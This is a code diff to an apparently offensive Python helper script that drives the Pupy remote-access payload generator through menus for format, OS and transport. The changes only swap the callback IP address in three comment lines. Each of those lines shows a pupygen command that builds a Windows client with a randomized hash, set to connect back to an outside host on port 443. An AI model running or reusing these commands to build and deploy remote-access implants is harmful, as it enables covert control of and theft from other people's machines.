@@ -25,7 +25,7 @@ format_Dict = {
 }
 
 # New syntax format Pupy Generator is...
-# python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443
+# python pupygen.py -f client -O windows --randomize-hash connect --host 54.241.135.223:443
 
 format_List = [
     '\n\t1 Client',
@@ -63,7 +63,7 @@ transport_List = [
 ]
 
 # New syntax format Pupy Generator is...
-# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
+# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 54.241.135.223:443
 
 OS_Dict = {
     '1': 'windows',
@@ -109,7 +109,7 @@ print ("\n\t".join(transport_List))
 Transport_Type = str(raw_input("Enter the TRANSPORT (PROTOCOL)"))
 Transport_Chosen = transport_Dict[Transport_Type]
 
-# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
+# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 54.241.135.223:443
     # assigns all the file extension types
 Format_Chosen = Format_Chosen
 if Format_Chosen == 'client':
